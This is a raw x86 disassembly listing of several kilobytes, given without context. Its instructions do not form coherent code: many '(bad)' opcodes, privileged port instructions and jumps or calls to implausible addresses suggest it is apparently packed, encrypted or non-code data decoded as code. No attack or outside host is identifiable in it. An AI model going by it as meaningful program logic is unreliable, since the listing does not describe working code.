  431dcb:	add    ecx,DWORD PTR [ebp-0x3f]
  431dce:	xor    ebx,DWORD PTR [edi]
  431dd0:	add    eax,ecx
  431dd2:	cmp    ebx,DWORD PTR [eax]
  431dd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431dd7:	mov    ecx,DWORD PTR [eax]
  431dd9:	adc    BYTE PTR [ebp-0x80],al
  431ddc:	jmp    0x431ddf
  431dde:	mov    eax,DWORD PTR [eax]
  431de0:	cld    
  431de1:	mov    bh,0xc6
  431de3:	push   ecx
  431de4:	(bad)  
  431de5:	jne    0x431e45
  431de7:	dec    ecx
  431de9:	or     BYTE PTR [ecx+ebx*1],cl
  431dec:	push   ebp
  431ded:	inc    ebp
  431dee:	in     al,dx
  431def:	add    ebp,esp
  431df1:	or     bh,al
  431df3:	dec    ebp
  431df4:	cld    
  431df5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431dfb:	xor    DWORD PTR [edx],0x2
  431dfe:	pushf  
  431dff:	dec    DWORD PTR [ebx+0x45510cf4]
  431e05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e0b:	mov    edx,DWORD PTR [ecx+0xc]
  431e0e:	xor    eax,esi
  431e10:	mov    edx,0xc172c7
  431e15:	inc    ebp
  431e16:	mov    esi,DWORD PTR [ebp+0x8]
  431e19:	mov    eax,edx
  431e1b:	call   0x84c7e510
  431e20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e26:	mov    ebp,eax
  431e28:	or     BYTE PTR [eax],dl
  431e2a:	jo     0x431e79
  431e2c:	push   edi
  431e2d:	xor    esi,DWORD PTR [ebp+0x3]
  431e30:	(bad)  
  431e31:	pmulhuw mm0,mm1
  431e34:	test   DWORD PTR [ebp-0x8],ecx
  431e37:	mov    DWORD PTR [ebp-0x67],eax
  431e3a:	mov    eax,DWORD PTR [ebp-0x4]
  431e3d:	xor    edi,DWORD PTR [ebp-0x73]
  431e40:	xor    eax,DWORD PTR [ebx]
  431e42:	xor    esi,DWORD PTR [edx+0x3]
  431e45:	add    BYTE PTR [ecx],bh
  431e47:	inc    ebp
  431e48:	(bad)  
  431e49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e4f:	mov    DWORD PTR [eax],0x750f0004
  431e55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e5b:	lock add BYTE PTR [ebp+0x0],cl
  431e5f:	mov    esi,DWORD PTR [ebp-0x18]
  431e62:	mov    ebp,edx
  431e64:	or     al,0x72
  431e66:	ja     0x431e68
  431e68:	mov    edx,esi
  431e6a:	cld    
  431e6b:	(bad)  
  431e6e:	cli    
  431e6f:	mov    esi,DWORD PTR [ebp-0x4]
  431e72:	cmp    ecx,esi
  431e74:	bswap  edi
  431e76:	(bad)
  431e7a:	mov    esi,DWORD PTR [ebp-0x4]
  431e7d:	mov    esi,ecx
  431e7f:	clc    
  431e80:	repnz add esi,DWORD PTR [ebp+0x45]
  431e84:	push   ebx
  431e85:	xor    eax,DWORD PTR [ebp+0x3]
  431e88:	cmp    al,0x5f
  431e8a:	pushf  
  431e8b:	pop    ebx
  431e8c:	jmp    0x431f53
  431e91:	mov    esi,DWORD PTR [ebp-0x7d]
  431e94:	xor    ebp,DWORD PTR [eax]
  431e96:	lea    eax,[ebp-0x8]
  431e99:	xor    edx,esi
  431e9b:	pushf  
  431e9c:	out    dx,eax
  431e9d:	(bad)  
  431e9e:	neg    eax
  431ea0:	ins    DWORD PTR es:[edi],dx
  431ea1:	test   esi,edi
  431ea3:	clc    
  431ea4:	pop    esp
  431ea5:	inc    ebp
  431ea6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431eac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431eb2:	add    cl,al
  431eb4:	jne    0x431e51
  431eb6:	mov    esi,DWORD PTR [edx]
  431eb8:	in     al,dx
  431eb9:	push   esi
  431eba:	xor    BYTE PTR [ebp-0xe],dh
  431ebd:	add    edi,esi
  431ebf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ec5:	add    cl,bh
  431ec7:	mov    edi,DWORD PTR [ebp+0x8]
  431eca:	mov    DWORD PTR [ebp-0x14],esi
  431ecd:	add    esi,DWORD PTR [ebp+0x3c]
  431ed0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431ed6:	mov    ah,0x3e
  431ed8:	fwait
  431ed9:	pushf  
  431eda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ee0:	jne    0x431e6d
  431ee2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ee5:	icebp  
  431ee6:	icebp  
  431ee7:	shl    edx,0xf2
  431eea:	(bad)  
  431eeb:	mov    ah,0x16
  431eed:	push   eax
  431eee:	jne    0x431e83
  431ef0:	mov    ecx,DWORD PTR [edi]
  431ef2:	in     al,dx
  431ef3:	jmp    0x431ee6
  431ef5:	add    dl,dh
  431ef7:	mov    edi,esi
  431ef9:	or     al,0x8
  431efb:	inc    ebp
  431efc:	jne    0x431f01
  431efe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f04:	ret    
  431f05:	or     bh,bh
  431f07:	jge    0x431ef1
  431f09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f0f:	xor    edi,eax
  431f11:	add    esi,DWORD PTR [ebp-0x77]
  431f14:	mov    ebx,esp
  431f16:	clc    
  431f17:	neg    DWORD PTR [ebp-0x7c]
  431f1a:	xor    eax,DWORD PTR [eax]
  431f1c:	cmp    eax,DWORD PTR [eax]
  431f1e:	repz jne 0x431eb6
  431f21:	xor    eax,DWORD PTR [ecx]
  431f23:	add    ebx,DWORD PTR [eax]
  431f25:	mov    DWORD PTR [ebp-0x8],eax
  431f28:	mov    eax,edi
  431f2a:	cld    
  431f2b:	lock pop eax
  431f2d:	test   DWORD PTR [ebx],esi
  431f2f:	clc    
  431f30:	add    edx,DWORD PTR [edi-0x740bff77]
  431f36:	fdivp  st(4),st
  431f38:	test   ecx,esi
  431f3a:	(bad)  
  431f3b:	jnp    0x431f3c
  431f3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f43:	jae    0x431ed0
  431f45:	sub    edi,esp
  431f47:	(bad)  
  431f48:	shl    DWORD PTR [eax-0x3e],0x89
  431f4c:	leave  
  431f4d:	call   0x8198d65a
  431f52:	in     al,dx
  431f53:	(bad)  
  431f54:	in     al,dx
  431f55:	add    bh,al
  431f57:	mov    esp,edi
  431f59:	in     al,dx
  431f5a:	test   DWORD PTR [ebp-0x8],edi
  431f5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431f60:	xor    al,BYTE PTR [ebx]
  431f62:	pushf  
  431f63:	jnp    0x57321b9c
  431f69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f6d:	loopne 0x431fa2
  431f6f:	jne    0x431f2c
  431f71:	mov    esi,DWORD PTR [edx-0x20]
  431f74:	add    BYTE PTR [ebp-0x3d],bh
  431f77:	xor    eax,DWORD PTR [ebp-0x73]
  431f7a:	mov    edi,DWORD PTR [esi]
  431f7c:	cld    
  431f7d:	jb     0x431f45
  431f7f:	add    bl,al
  431f81:	jne    0x431fc8
  431f83:	mov    edx,DWORD PTR [edi-0x10]
  431f86:	jge    0x432005
  431f88:	mov    esi,DWORD PTR [ebx]
  431f8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f8e:	xor    esi,DWORD PTR [ebp-0x77]
  431f91:	mov    esi,eax
  431f93:	lock inc ebp
  431f95:	jge    0x431fc8
  431f97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f9e:	dec    ebp
  431f9f:	mov    esi,DWORD PTR [ebx]
  431fa1:	loopne 0x431f2c
  431fa3:	jge    0x431f9d
  431fa5:	add    DWORD PTR [ebp-0x7d],eax
  431fa8:	icebp  
  431fa9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fb0:	dec    ebp
  431fb1:	hlt    
  431fb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431fb5:	mov    esi,esp
  431fb7:	in     al,0x45
  431fb9:	jge    0x431ff8
  431fbb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fc2:	dec    ebp
  431fc3:	push   esp
  431fc4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fca:	inc    ebp
  431fcb:	hlt    
  431fcc:	xor    DWORD PTR [ebp-0x61],esi
  431fcf:	mov    edi,DWORD PTR [eax+0xf19504]
  431fd5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fd9:	cmp    eax,DWORD PTR [ebp+0xf]
  431fdc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431fe0:	fistp  WORD PTR [ebx+0x0]
  431fe3:	inc    ebp
  431fe4:	mov    ebx,DWORD PTR [edi+0xc]
  431fe7:	add    eax,eax
  431fe9:	inc    ebp
  431fea:	test   BYTE PTR [ebx],dh
  431fec:	add    eax,DWORD PTR [ebx]
  431fee:	add    BYTE PTR [esi+0x45],bl
  431ff1:	ret    0x85
  431ff4:	jnp    0x5443a3c3
  431ffa:	inc    bp
  431ffc:	inc    ebp
  431ffd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432003:	fdiv   QWORD PTR [ebx]
  432005:	test   DWORD PTR [ecx+0x453bf8],edi
  43200b:	push   ebx
  43200c:	add    edi,DWORD PTR [esi+0x708088b]
  432012:	cmp    esi,eax
  432014:	setnp  BYTE PTR [ecx-0x74fcffce]
  43201b:	mov    esp,edi
  43201d:	call   0x33ce656f
  432022:	or     BYTE PTR [ebx],al
  432024:	inc    ecx
  432025:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43202b:	and    BYTE PTR [ebp-0x7074f0bb],al
  432031:	lock add cl,al
  432034:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43203b:	mov    ch,0x45
  43203d:	clc    
  43203e:	xor    eax,DWORD PTR [ebp+0x3]
  432041:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432047:	inc    ebp
  432048:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  43204e:	mov    edi,eax
  432050:	mov    eax,DWORD PTR [ebp+0x3c]
  432053:	mov    ecx,DWORD PTR [eax]
  432055:	hlt    
  432056:	inc    ebp
  432057:	ror    DWORD PTR [ebx+0x818c45],0xf4
  43205e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432064:	push   ebp
  432065:	mov    edi,DWORD PTR [ebx]
  432067:	in     al,dx
  432068:	jne    0x43202b
  43206a:	mov    eax,DWORD PTR [ebp-0x28]
  43206d:	add    DWORD PTR [eax],0xe8058dec
  432073:	clc    
  432074:	mov    esi,DWORD PTR [edi-0x8]
  432077:	add    dh,dl
  432079:	rol    WORD PTR [ebp-0x1],cl
  43207d:	mov    edx,DWORD PTR [eax+0x8]
  432080:	jne    0x432042
  432082:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432089:	inc    ebp
  43208a:	push   esp
  43208b:	test   DWORD PTR [ecx+0xf],ecx
  43208e:	sub    edx,esp
  432090:	add    eax,DWORD PTR [eax]
  432092:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432098:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43209f:	mov    eax,DWORD PTR [ecx]
  4320a1:	and    BYTE PTR [eax],al
  4320a3:	cmp    al,0x10
  4320a5:	add    BYTE PTR [ebp+0x66],al
  4320a8:	inc    ecx
  4320aa:	push   esp
  4320ab:	add    dh,BYTE PTR [ebp+0x0]
  4320ae:	push   edx
  4320af:	enterw 0xc1,0x4d
  4320b4:	mov    esp,DWORD PTR [esi+0x20]
  4320b7:	add    DWORD PTR [ecx-0x7b],eax
  4320ba:	add    eax,DWORD PTR [ebx]
  4320bc:	str    WORD PTR [eax+0x45]
  4320c0:	lea    ecx,[ebx+0x45890801]
  4320c6:	sbb    BYTE PTR [ebx],al
  4320c8:	dec    ebp
  4320c9:	cmp    al,0xf
  4320cb:	inc    ebp
  4320cc:	push   eax
  4320cd:	mov    esi,DWORD PTR [ebx]
  4320cf:	push   eax
  4320d0:	add    eax,eax
  4320d2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320d9:	inc    ebp
  4320da:	add    BYTE PTR [ecx],dh
  4320dc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320e3:	(bad)  
  4320e4:	mov    ebx,eax
  4320e6:	loopne 0x43212d
  4320e8:	dec    ebp
  4320e9:	mov    ecx,DWORD PTR [edi]
  4320eb:	cld    
  4320ec:	push   eax
  4320ed:	xchg   DWORD PTR [ebx],esi
  4320ef:	add    DWORD PTR [ebx],ebp
  4320f1:	add    BYTE PTR [ebx],ch
  4320f3:	or     BYTE PTR [ecx],bh
  4320f5:	dec    ecx
  4320f6:	loopne 0x4320fb
  4320f8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  4320fe:	push   ebp
  4320ff:	add    DWORD PTR [ebx+0x55100800],eax
  432105:	dec    ebp
  432106:	jmp    0x432091
  432108:	mov    esp,DWORD PTR [eax]
  43210a:	sbb    dl,dl
  43210c:	inc    eax
  43210d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432113:	add    BYTE PTR [ebx+0x74528555],cl
  432119:	push   ebp
  43211a:	div    DWORD PTR [ebx]
  43211c:	and    eax,DWORD PTR [ebx]
  43211e:	add    edx,DWORD PTR [edx-0x30]
  432121:	jno    0x4320ae
  432123:	inc    DWORD PTR [eax+eiz*1]
  432126:	inc    ebp
  432127:	push   eax
  432128:	push   eax
  432129:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43212f:	mov    edi,esp
  432131:	push   eax
  432132:	inc    ebp
  432133:	enter  0x458b,0x8
  432137:	push   ecx
  432138:	(bad)  
  432139:	call   0x10d2b11
  43213e:	pop    ss
  43213f:	push   ebp
  432140:	mov    ecx,DWORD PTR [ebx+0x489408]
  432146:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43214c:	push   ecx
  43214d:	jo     0x432137
  43214f:	inc    DWORD PTR [edi]
  432151:	or     BYTE PTR [eax],al
  432153:	call   0xce289d
  432158:	fmul   QWORD PTR [ebp+0x55]
  43215b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432161:	mov    bh,0x8c
  432163:	adc    al,0x9b
  432165:	dec    esp
  432166:	xor    bl,BYTE PTR [eax]
  432168:	mov    ecx,DWORD PTR [ebp+0xc]
  43216b:	mov    eax,DWORD PTR [ebp-0x4]
  43216e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432174:	push   es
  432175:	retf   
  432176:	mov    BYTE PTR [ebp-0x30],0x3b
  43217a:	inc    ebp
  43217b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432182:	retf   0x83fc
  432185:	into   
  432186:	dec    ebp
  432187:	retf   
  432188:	mov    ecx,DWORD PTR [ebp-0x74]
  43218b:	mov    eax,DWORD PTR [eax]
  43218d:	fdiv   QWORD PTR [ebx]
  43218f:	mov    bh,0x3
  432191:	push   es
  432192:	mov    esi,ecx
  432194:	sbb    cl,dl
  432196:	dec    ebp
  432197:	sar    DWORD PTR [ebx],cl
  432199:	push   ebp
  43219a:	jne    0x4321ab
  43219c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321a2:	lea    ebx,[eax]
  4321a4:	call   0xf4ccad6b
  4321a9:	sbb    dh,dl
  4321ab:	add    edx,ebx
  4321ad:	push   ebp
  4321ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321b4:	push   ecx
  4321b5:	mov    DWORD PTR [eax-0x30],edx
  4321b8:	test   DWORD PTR [edx],eax
  4321ba:	xadd   esp,esi
  4321bd:	pop    es
  4321be:	add    cl,dl
  4321c0:	mov    eax,ecx
  4321c2:	or     al,0x45
  4321c4:	(bad)  
  4321c5:	push   eax
  4321c6:	add    DWORD PTR [edx+0x0],eax
  4321c9:	add    ecx,DWORD PTR [ecx]
  4321cb:	and    dh,cl
  4321cd:	call   0xc72a9d
  4321d2:	add    DWORD PTR [ebp+0x0],edx
  4321d5:	mov    esp,DWORD PTR [ebp+0x18]
  4321d8:	add    BYTE PTR [eax+0x50],cl
  4321db:	xor    eax,DWORD PTR [eax]
  4321dd:	add    esp,DWORD PTR [esi+0x3b]
  4321e0:	inc    ebp
  4321e1:	je     0x432166
  4321e3:	push   ecx
  4321e4:	dec    BYTE PTR [ebp-0x77]
  4321e7:	add    eax,esi
  4321e9:	or     al,0x5e
  4321eb:	inc    eax
  4321ec:	add    BYTE PTR [ebx],al
  4321ee:	data16 and BYTE PTR [ebp+0x50],al
  4321f2:	sub    DWORD PTR [ecx],0xfffffff8
  4321f5:	add    BYTE PTR [ebp-0x75],ah
  4321f8:	add    BYTE PTR [eax],bl
  4321fa:	enter  0x894d,0x8b
  4321fe:	int3   
  4321ff:	loopne 0x4321c3
  432201:	rol    BYTE PTR [eax],0x33
  432204:	lea    cx,[ebp+0xa]
  432208:	data16 jb 0x432250
  43220b:	add    BYTE PTR [ebx+0x44890855],cl
  432211:	sbb    ah,al
  432213:	inc    ebp
  432214:	cmp    al,0xf
  432216:	add    BYTE PTR [edx+0x66],dl
  432219:	xor    ecx,DWORD PTR [eax]
  43221b:	sub    eax,DWORD PTR [edx]
  43221d:	mov    eax,DWORD PTR [eax]
  43221f:	or     al,0x66
  432221:	ror    edx,cl
  432223:	dec    ebp
  432224:	inc    ebp
  432225:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43222b:	cld    
  43222c:	or     BYTE PTR [edi+0x4501dd],dl
  432232:	ret    0xecce
  432235:	retf   
  432236:	(bad)  
  432237:	dec    ebp
  432238:	mov    al,0x8b
  43223a:	loopne 0x43225c
  43223c:	cmp    ecx,DWORD PTR [edx]
  43223e:	inc    ebp
  43223f:	daa    
  432240:	loopne 0x4321c9
  432242:	in     al,dx
  432243:	add    edi,eax
  432245:	add    BYTE PTR [eax+0x3f52e155],bh
  43224b:	push   ebp
  43224c:	inc    ebp
  43224d:	xor    ebx,edx
  43224f:	add    ebp,esp
  432251:	push   edx
  432252:	push   bp
  432254:	inc    ebp
  432255:	(bad)  
  432256:	in     eax,dx
  432257:	push   esp
  432258:	(bad)  
  432259:	inc    edx
  43225b:	sbb    al,0x33
  43225d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432264:	add    BYTE PTR [ebp+0x46],0x8b
  432268:	jmp    0xf98b:0x100041c8
  43226f:	xor    esi,DWORD PTR [edx+0x3]
  432272:	mov    ecx,DWORD PTR [edi]
  432274:	fmul   DWORD PTR [edx]
  432276:	add    BYTE PTR [eax],al
  432278:	lea    eax,[ebx-0x4700273c]
  43227e:	add    al,0x4f
  432280:	pop    DWORD PTR [eax]
  432282:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432288:	push   edx
  432289:	inc    WORD PTR [ebp+0x8]
  43228d:	mov    eax,0x514f4d
  432292:	(bad)
  432296:	add    al,al
  432298:	xor    DWORD PTR [ebx-0x74baf730],eax
  43229e:	test   DWORD PTR [esi+0x74],esp
  4322a1:	inc    ebp
  4322a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4322a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322ae:	or     dh,cl
  4322b0:	or     eax,0x8b8d5045
  4322b5:	inc    ebp
  4322b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4322bc:	jne    0x4322f1
  4322be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322c4:	add    DWORD PTR [ebx],eax
  4322c6:	add    bh,bh
  4322c8:	adc    DWORD PTR [eax],ecx
  4322ca:	adc    DWORD PTR [ebp+0x55],edi
  4322cd:	push   es
  4322ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322db:	inc    ebp
  4322dc:	mov    esp,edi
  4322de:	or     al,0xda
  4322e0:	push   eax
  4322e1:	(bad)  
  4322e2:	jne    0x432298
  4322e4:	call   0x3b1bd3
  4322e9:	inc    ebp
  4322ea:	sar    BYTE PTR [eax],0x84
  4322ed:	in     al,dx
  4322ee:	add    bh,al
  4322f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4322f7:	(bad)  
  4322f8:	and    al,al
  4322fa:	fs in  eax,dx
  4322fc:	inc    DWORD PTR [ebp-0x7b]
  4322ff:	jle    0x432310
  432301:	leave  
  432302:	scas   al,BYTE PTR es:[edi]
  432303:	inc    esp
  432304:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43230b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432312:	call   DWORD PTR [edi]
  432314:	shr    ah,0x84
  432317:	xchg   DWORD PTR [eax],eax
  432319:	add    DWORD PTR [eax],eax
  43231b:	add    bh,bh
  43231d:	dec    ebp
  43231e:	and    BYTE PTR [ecx-0x38],dl
  432321:	push   eax
  432322:	dec    DWORD PTR [ebx+0xfd885]
  432328:	mov    BYTE PTR [ebp+0x508bac00],cl
  43232e:	mov    WORD PTR [ecx+0x0],ss
  432331:	lea    ecx,[ebx+0x108b20d8]
  432337:	mov    WORD PTR [edx],ds
  432339:	add    BYTE PTR [edi+0xff01ff],al
  43233f:	mov    ecx,DWORD PTR [ebp-0x28]
  432342:	push   ecx
  432343:	shl    BYTE PTR [ebp+0x3a],0x8b
  432347:	inc    ebp
  432348:	in     al,0xeb
  43234a:	jno    0x4322d7
  43234c:	push   edx
  43234d:	mov    DWORD PTR [eax-0x28],edx
  432350:	mov    eax,DWORD PTR [ebp+0x20]
  432353:	je     0x4322dc
  432355:	mov    eax,DWORD PTR [ecx]
  432357:	sbb    BYTE PTR [eax],al
  432359:	pop    DWORD PTR [eax]
  43235b:	add    esi,eax
  43235d:	add    bl,al
  43235f:	adc    DWORD PTR [edi],esi
  432361:	jmp    0x8bce73b3
  432366:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43236d:	jne    0x4322fa
  43236f:	mov    ecx,DWORD PTR [eax]
  432371:	in     al,0x75
  432373:	pop    DWORD PTR [ecx+0x5401]
  432379:	push   edx
  43237a:	inc    DWORD PTR [ebx]
  43237c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432382:	add    BYTE PTR [edi+0x9],dl
  432385:	call   DWORD PTR [esi]
  432387:	and    dl,al
  432389:	and    bh,bh
  43238b:	inc    edi
  43238d:	test   eax,edx
  43238f:	sldt   ebx
  432392:	xor    al,BYTE PTR [eax]
  432394:	pushf  
  432395:	(bad)  
  432396:	jmp    0x4323a4
  432398:	mov    eax,edi
  43239a:	or     al,0x75
  43239c:	inc    eax
  43239d:	call   0x431aa5
  4323a2:	mov    eax,eax
  4323a4:	loopne 0x43232a
  4323a6:	inc    ebp
  4323a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4323ad:	mov    eax,DWORD PTR [ebp+0x20]
  4323b0:	add    edi,ecx
  4323b2:	add    BYTE PTR [eax],ch
  4323b4:	cmp    edi,0x18
  4323b7:	test   DWORD PTR [ebp+0xf],esi
  4323ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323c1:	jne    0x4323c5
  4323c3:	call   0xffa21e88
  4323c8:	leave  
  4323c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4323cd:	add    ah,ch
  4323cf:	add    BYTE PTR [edi-0x48fef979],dh
  4323d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323dc:	inc    esp
  4323dd:	mov    ebx,DWORD PTR [eax]
  4323df:	fcom   st(2)
  4323e1:	add    BYTE PTR [edi],bl
  4323e3:	lea    ecx,[eax-0x18]
  4323e6:	(bad)  
  4323e7:	push   DWORD PTR [ecx]
  4323e9:	call   0xffb5714b
  4323ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4323f2:	fstp   DWORD PTR [esi+ebx*8]
  4323f5:	push   ebp
  4323f6:	pop    ebp
  4323f7:	mov    esi,DWORD PTR [edx-0x38]
  4323fa:	add    DWORD PTR [eax],0x28
  4323fd:	mov    edi,DWORD PTR [ebx]
  4323ff:	xor    esi,DWORD PTR [edx+0x3]
  432402:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432406:	pop    ebp
  432407:	or     al,0x4
  432409:	inc    ecx
  43240a:	push   ebp
  43240b:	(bad)  
  43240c:	in     al,dx
  43240d:	or     ah,ch
  43240f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432410:	xbegin 0xffc89a06
  432416:	clc    
  432417:	adc    al,0x45
  432419:	div    BYTE PTR [edx]
  43241b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432422:	test   DWORD PTR [ebx+0x666300f8],ebx
  432428:	add    BYTE PTR [ecx+0x66],dh
  43242b:	add    eax,DWORD PTR [ebp+0x52]
  43242e:	adc    eax,0xffffffa0
  432431:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432437:	test   DWORD PTR [eax],eax
  432439:	clc    
  43243a:	data16 or al,BYTE PTR [ebp+0x45]
  43243e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432445:	rol    BYTE PTR [ebp+0x45],1
  432448:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43244e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432454:	push   ebx
  432455:	add    BYTE PTR [eax+eax*1+0x51],dl
  432459:	jge    0x43248e
  43245b:	add    BYTE PTR [esi+0x4],dl
  43245e:	jne    0x4324c5
  432460:	mov    edx,0x457200
  432465:	jmp    0x432429
  432467:	xor    edi,DWORD PTR [ebx]
  432469:	pop    edi
  43246a:	cvtdq2ps xmm7,xmm0
  43246d:	ret    0x0
  432470:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432476:	xor    ecx,DWORD PTR [edi]
  432478:	add    eax,DWORD PTR [ecx+0x3b]
  43247b:	push   ebx
  43247c:	rdpmc  
  43247e:	out    0x8d,al
  432480:	add    BYTE PTR [eax],cl
  432482:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432488:	ret    0x450c
  43248b:	sbb    al,0x8b
  43248d:	cmp    eax,esi
  43248f:	or     cl,al
  432491:	or     al,0xc2
  432493:	pop    eax
  432494:	inc    ebp
  432495:	add    ecx,DWORD PTR [edi]
  432497:	add    esi,DWORD PTR [ebp+0x39]
  43249a:	invd   
  43249c:	jge    0x4324a8
  43249e:	mov    eax,0x478ac0
  4324a3:	cli    
  4324a4:	xor    esp,ecx
  4324a6:	mov    ebx,0x5b8ac0
  4324ab:	ret    0x33
  4324ae:	mov    eax,0x833b8b
  4324b3:	sub    BYTE PTR [ebx],al
  4324b5:	inc    ebp
  4324b6:	xor    ax,di
  4324b9:	pushf  
  4324ba:	inc    bh
  4324bc:	mov    esp,esp
  4324be:	hlt    
  4324bf:	test   DWORD PTR [ebp-0x8],esi
  4324c2:	mov    eax,DWORD PTR [ebp-0x14]
  4324c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324cb:	dec    edi
  4324cc:	or     BYTE PTR [eax],al
  4324ce:	jne    0x432459
  4324d0:	mov    esi,esp
  4324d2:	call   0x77a9b097
  4324d7:	inc    ebp
  4324d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324e4:	add    BYTE PTR [esi+0x7d],ah
  4324e7:	inc    ebp
  4324e8:	mov    bx,WORD PTR [ebp+0x8]
  4324ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4324f3:	inc    ebp
  4324f4:	mov    bx,di
  4324f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4324fe:	jge    0x4324c1
  432500:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432506:	cli    
  432507:	xor    bl,bh
  432509:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43250f:	test   BYTE PTR [eax],cl
  432511:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432518:	cmp    ebp,eax
  43251a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432521:	test   BYTE PTR [ebp+0x1],bh
  432524:	mov    ebx,0x458a00
  432529:	xor    esi,DWORD PTR [ebx]
  43252b:	add    esp,DWORD PTR [esi-0x77]
  43252e:	pop    ebp
  43252f:	loopne 0x432597
  432531:	inc    ebp
  432532:	clc    
  432533:	xor    edi,DWORD PTR [ebx]
  432535:	add    esi,DWORD PTR [edx-0x77]
  432538:	data16 fdivr QWORD PTR [ebp-0x49]
  43253c:	mov    ebx,0xb78afc
  432541:	hlt    
  432542:	xor    edi,DWORD PTR [esi+eiz*2]
  432545:	add    BYTE PTR [ebp+0x66],bl
  432548:	data16 lock clc 
  43254b:	cmp    al,0x3b
  43254d:	add    BYTE PTR [edi+0x66],dh
  432550:	psubq  mm7,QWORD PTR [ebp+0x2]
  432554:	ltr    WORD PTR [ebp+0x66]
  432558:	add    esi,eax
  43255a:	add    di,WORD PTR [ebp+0x2b]
  43255e:	data16 data16 jge 0x4325df
  432562:	mov    ebx,0xe08a8b
  432567:	jge    0x43259c
  432569:	data16 data16 xor al,0x5d
  43256d:	data16 data16 jne 0x432569
  432571:	mov    edi,DWORD PTR [ebx]
  432573:	fdiv   QWORD PTR [edx+0x7d]
  432576:	data16 data16 jge 0x4325ae
  43257a:	mov    ebx,0x758a66
  43257f:	mov    esi,0x667233
  432584:	pop    ebp
  432585:	or     BYTE PTR [esi+0x0],ah
  432588:	clc    
  432589:	mov    edi,DWORD PTR [ebx]
  43258b:	lock ja 0x432519
  43258e:	(bad)  
  432590:	jge    0x432589
  432592:	invd   
  432594:	pop    ebp
  432595:	add    BYTE PTR [ebx],al
  432597:	(bad)  
  432598:	cmp    di,WORD PTR [ebp+0xf]
  43259c:	data16 sbb bh,BYTE PTR [ebp+0x0]
